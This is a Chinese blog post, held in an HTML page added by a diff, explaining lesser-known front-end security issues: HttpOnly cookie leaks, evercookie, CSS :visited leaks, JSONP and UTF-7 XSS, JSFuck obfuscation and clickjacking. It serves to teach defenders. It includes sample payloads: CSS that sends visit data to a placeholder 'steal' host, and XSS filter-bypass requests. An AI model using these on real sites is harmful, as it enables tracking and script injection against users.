@@ -1,0 +1,187 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>前端安全冷门知识杂谈 | SoulReader</title><meta name="keywords" content="web"><meta name="author" content="lxx,1987607597@qq.com"><meta name="copyright" content="lxx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节：  盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学                    资料">
+<meta property="og:type" content="article">
+<meta property="og:title" content="前端安全冷门知识杂谈">
+<meta property="og:url" content="https://lxxstar987.gitee.io/lxx1997.github.io/2014/05/27/safety-point-of-view-from-front-end/index.html">
+<meta property="og:site_name" content="SoulReader">
+<meta property="og:description" content="零、概述提起web前端安全，大家都会想到两个名词：xss和csrf。抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。大概分为以下章节：  盗取无法用js读写的Cookie删不掉的本地存储函数覆写监听上报内存Cookie与硬盘CookieCSS带来的点击量泄露JSONP回调函数与UTF-7编码过滤与代码混淆心理学与社会工程学                    资料">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+<meta property="article:published_time" content="2014-05-27T15:52:00.000Z">
+<meta property="article:modified_time" content="2020-12-17T01:20:57.873Z">
+<meta property="article:author" content="lxx">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><link rel="shortcut icon" href="/lxx1997.github.io/img/favicon.png"><link rel="canonical" href="https://lxxstar987.gitee.io/lxx1997.github.io/2014/05/27/safety-point-of-view-from-front-end/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/lxx1997.github.io/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/lxx1997.github.io/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '前端安全冷门知识杂谈',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-12-17 09:20:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/lxx1997.github.io/atom.xml" title="SoulReader" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/lxx1997.github.io/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/lxx1997.github.io/archives/"><div class="headline">Articles</div><div class="length-num">114</div></a><a href="/lxx1997.github.io/tags/"><div class="headline">Tags</div><div class="length-num">79</div></a><a href="/lxx1997.github.io/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/lxx1997.github.io/">SoulReader</a></span><div id="menus"><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">前端安全冷门知识杂谈</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2014-05-27T15:52:00.000Z" title="Created 2014-05-27 23:52:00">2014-05-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-12-17T01:20:57.873Z" title="Updated 2020-12-17 09:20:57">2020-12-17</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="前端安全冷门知识杂谈"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="零、概述"><a href="#零、概述" class="headerlink" title="零、概述"></a>零、概述</h3><p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br>抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。<br>大概分为以下章节：</p>
+<blockquote>
+<p>盗取无法用js读写的Cookie<br>删不掉的本地存储<br>函数覆写监听上报<br>内存Cookie与硬盘Cookie<br>CSS带来的点击量泄露<br>JSONP回调函数与UTF-7编码<br>过滤与代码混淆<br>心理学与社会工程学                  </p>
+</blockquote>
+<p>资料略多，文章较长，请自备瓜子…</p>
+<h3 id="一、盗取无法用js读写的Cookie"><a href="#一、盗取无法用js读写的Cookie" class="headerlink" title="一、盗取无法用js读写的Cookie"></a>一、盗取无法用js读写的Cookie</h3><p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">setcookie</span>(<span class="string">&quot;test&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>); // 设置普通Cookie</span><br><span class="line"><span class="attribute">setcookie</span>(<span class="string">&quot;test_http&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>, <span class="number">1</span>);// 第<span class="number">7</span>个参数是HttpOnly 标志，<span class="number">0</span> 为关闭(默认)，<span class="number">1</span> 为开启</span><br></pre></td></tr></table></figure><br>我们还是可以通过一些服务器上的漏洞去获取它们。</p>
+<h4 id="2-1-调试信息泄露"><a href="#2-1-调试信息泄露" class="headerlink" title="2.1) 调试信息泄露"></a>2.1) 调试信息泄露</h4><p>比较经典的是PHP的phpinfo文件：<br><img src="/assets/blogImg/safety_001.jpg" alt="phpinfo文件"><br>如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。<br>访问phpinfo.php，将看到：<br><img src="/assets/blogImg/safety_002.jpg" alt="Alt text"><br>其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。                  </p>
+<h4 id="2-2-Apache-2-2-x版本请求头超长泄露"><a href="#2-2-Apache-2-2-x版本请求头超长泄露" class="headerlink" title="2.2) Apache 2.2.x版本请求头超长泄露"></a>2.2) Apache 2.2.x版本请求头超长泄露</h4><p>Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。<br>因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。<br><img src="/assets/blogImg/safety_003.jpg" alt="Alt text">                    </p>
+<h3 id="三、删不掉的本地存储"><a href="#三、删不掉的本地存储" class="headerlink" title="三、删不掉的本地存储"></a>三、删不掉的本地存储</h3><p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。<br>但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p>
+<blockquote>
+<p>Cookie - 是最常见的方式，key-value 模式<br>UserData - IE自己的本地存储，key-value 模式<br>localStorage - HTML5 新增的本地存储，key-value 模式<br>local Database -  HTML5 新增的浏览器本地DataBase，是SQLite 数据库<br>Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器                   </p>
+</blockquote>
+<p>除去这些，我还收集了一些比较“偏门”的存储方案：          </p>
+<blockquote>
+<p>Silverlight的IsolatedStorage - 类似HTML5 localStorage<br>PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值<br>HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br>Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）<br>window.name，本质就是一个DOM 存储，并不存在本地。                   </p>
+</blockquote>
+<p>老外Samy Kamkar用半天开发了一个JavaScript API：<a target="_blank" rel="noopener" href="http://en.wikipedia.org/wiki/Evercookie">evercookie</a>。<br>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p>
+<h3 id="四、函数覆写监听上报"><a href="#四、函数覆写监听上报" class="headerlink" title="四、函数覆写监听上报"></a>四、函数覆写监听上报</h3><p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">log</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span><br><span class="line">    img.<span class="property">src</span> = <span class="string">&quot;http://yousite.com/log.php?caller=&quot;</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _alert = alert;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">alert</span> = <span class="keyword">function</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="title function_">log</span>(alert.<span class="property">caller</span>);</span><br><span class="line">    <span class="title function_">_alert</span>(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…<br>其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《<a target="_blank" rel="noopener" href="http://www.xfocus.net/articles/200712/963.html">浅谈javascript函数劫持</a>》。</p>
+<h3 id="五、内存Cookie与硬盘Cookie"><a href="#五、内存Cookie与硬盘Cookie" class="headerlink" title="五、内存Cookie与硬盘Cookie"></a>五、内存Cookie与硬盘Cookie</h3><p><code>内存Cookie</code> - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁<br><code>硬盘Cookie</code> - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期</p>
+<p>我们很容易得出结论：内存Cookie更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。                  </p>
+<p>因此，这里有两个关注点：                 </p>
+<ol>
+<li>敏感信息还是不要放Cookie里，即使是内存Cookie；              </li>
+<li>服务器要做Cookie的三个维度的校验 -  唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。               </li>
+</ol>
+<h3 id="六、CSS带来的点击量泄露"><a href="#六、CSS带来的点击量泄露" class="headerlink" title="六、CSS带来的点击量泄露"></a>六、CSS带来的点击量泄露</h3><p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br>假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。<br>试想这是一个<code>导航栏组件</code>，html代码是这样的：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;http://yousite.com/a1&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;a1&quot;</span>&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;http://yousite.com/a2&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;a2&quot;</span>&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">&quot;http://yousite.com/a3&quot;</span> <span class="attribute">id</span>=<span class="string">&quot;a3&quot;</span>&gt;nav3&lt;/a&gt;</span><br></pre></td></tr></table></figure><br>你忽略掉的css写成这样：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a1</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://report.com/steal?data=a1</span>);&#125;</span><br><span class="line"><span class="selector-id">#a2</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://report.com/steal?data=a2</span>);&#125;</span><br><span class="line"><span class="selector-id">#a3</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">http://report.com/steal?data=a3</span>);&#125;</span><br></pre></td></tr></table></figure><br>我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！<br>当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…<br>HTML5提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。                         </p>
+<h3 id="七、JSONP回调函数与UTF-7编码"><a href="#七、JSONP回调函数与UTF-7编码" class="headerlink" title="七、JSONP回调函数与UTF-7编码"></a>七、JSONP回调函数与UTF-7编码</h3><h4 id="7-1-基本原理"><a href="#7-1-基本原理" class="headerlink" title="7.1) 基本原理"></a>7.1) 基本原理</h4><p>在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code><br>返回数据格式为：<br><code>some_function([&#123;&#39;id&#39;:123, data:&#39;some_data&#39;&#125;]);</code><br>如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。<br>请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code><br>返回：<br><code>&lt;script&gt;alert(1);&lt;/script&gt;([&#123;&#39;id&#39;:123, data:&#39;some_data&#39;&#125;]);</code><br>所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？                              </p>
+<h4 id="7-2-IE解析UTF-7漏洞"><a href="#7-2-IE解析UTF-7漏洞" class="headerlink" title="7.2) IE解析UTF-7漏洞"></a>7.2) IE解析UTF-7漏洞</h4><p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成html标签。但在IE6\IE7的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析</strong>（IE7后续版本已发布补丁修复）。<br>在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：<br><code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code><br>这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4(&#123;‘id’=&gt;123,data=&gt;’some_data’&#125;);</code><br>这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。                       </p>
+<h3 id="八、过滤与代码混淆"><a href="#八、过滤与代码混淆" class="headerlink" title="八、过滤与代码混淆"></a>八、过滤与代码混淆</h3><p>过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a target="_blank" rel="noopener" href="http://utf-8.jp/public/jsfuck.html">jsfuck</a>。<br>站名如其名，满满的恶意…它可以仅仅用6个字符：<code>[]()!+</code>去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句<code>alert(1)</code>编码成了3009个字符，并执行成功：<br><img src="/assets/blogImg/safety_004.jpg" alt="Alt text"><br>所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p>
+<h3 id="九、心理学与社会工程学"><a href="#九、心理学与社会工程学" class="headerlink" title="九、心理学与社会工程学"></a>九、心理学与社会工程学</h3><p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p>
+<h4 id="9-1）诱导触发拖拽事件"><a href="#9-1）诱导触发拖拽事件" class="headerlink" title="9.1）诱导触发拖拽事件"></a>9.1）诱导触发拖拽事件</h4><p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？<br>很简单，添加一张图片：<br><img src="/assets/blogImg/safety_005.jpg" alt="Alt text"><br>注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p>
+<h4 id="9-2-传说中的QQ空间“传染病毒”"><a href="#9-2-传说中的QQ空间“传染病毒”" class="headerlink" title="9.2) 传说中的QQ空间“传染病毒”"></a>9.2) 传说中的QQ空间“传染病毒”</h4><p>步骤是这样的：                    </p>
+<ol>
+<li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code>                     </li>
+<li>A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面                     </li>
+<li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）                     </li>
+<li>一传十十传百，越传越广…                     </li>
+</ol>
+<p>但真实的情况跟CSRF没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code><br>这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br>用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…                     </p>
+<p>有人会问，这不是CSRF吗？还真不是。做法却很简单：<br>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。                     </p>
+<p>以上。<br>End. 5.27 by litten.                                           </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://lxxstar987.gitee.io/lxx1997.github.io">lxx</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://lxxstar987.gitee.io/lxx1997.github.io/2014/05/27/safety-point-of-view-from-front-end/">https://lxxstar987.gitee.io/lxx1997.github.io/2014/05/27/safety-point-of-view-from-front-end/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/lxx1997.github.io/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/lxx1997.github.io/2014/07/25/folder-to-tree/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/lxx1997.github.io/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">一个文件夹的自我介绍</div></div></a></div><div class="next-post pull-right"><a href="/lxx1997.github.io/2014/03/30/volunteer-activities/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/lxx1997.github.io/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">小朋友，跟你谈谈印象派</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/lxx1997.github.io/2021/01/06/%E9%9D%A2%E8%AF%95%E9%A2%98%E8%AF%A6%E8%A7%A3-other-from-internat/" title="面试题解析 - other people"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-06</div><div class="title">面试题解析 - other people</div></div></a></div><div><a href="/lxx1997.github.io/2014/10/05/history-of-browser-useragent2/" title="浏览器野史 UserAgent列传（下）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2014-10-05</div><div class="title">浏览器野史 UserAgent列传（下）</div></div></a></div><div><a href="/lxx1997.github.io/2014/09/26/history-of-browser-useragent/" title="浏览器野史 UserAgent列传（上）"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2014-09-26</div><div class="title">浏览器野史 UserAgent列传（上）</div></div></a></div><div><a href="/lxx1997.github.io/2014/03/03/instagram-api-ex/" title="instagram图片拉取小经验"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2014-03-03</div><div class="title">instagram图片拉取小经验</div></div></a></div><div><a href="/lxx1997.github.io/2013/10/06/handling-asynchronous-js/" title="统一处理异步的js回调"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2013-10-06</div><div class="title">统一处理异步的js回调</div></div></a></div><div><a href="/lxx1997.github.io/2013/09/25/web-worker-learning/" title="web worker简易入门"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2013-09-25</div><div class="title">web worker简易入门</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/lxx1997.github.io/img/avatar.png" onerror="this.onerror=null;this.src='/lxx1997.github.io/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lxx</div><div class="author-info__description">前端小菜鸟,努力深造</div></div><div class="card-info-data site-data is-center"><a href="/lxx1997.github.io/archives/"><div class="headline">Articles</div><div class="length-num">114</div></a><a href="/lxx1997.github.io/tags/"><div class="headline">Tags</div><div class="length-num">79</div></a><a href="/lxx1997.github.io/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9B%B6%E3%80%81%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">零、概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%9B%97%E5%8F%96%E6%97%A0%E6%B3%95%E7%94%A8js%E8%AF%BB%E5%86%99%E7%9A%84Cookie"><span class="toc-number">2.</span> <span class="toc-text">一、盗取无法用js读写的Cookie</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-%E8%B0%83%E8%AF%95%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text">2.1) 调试信息泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 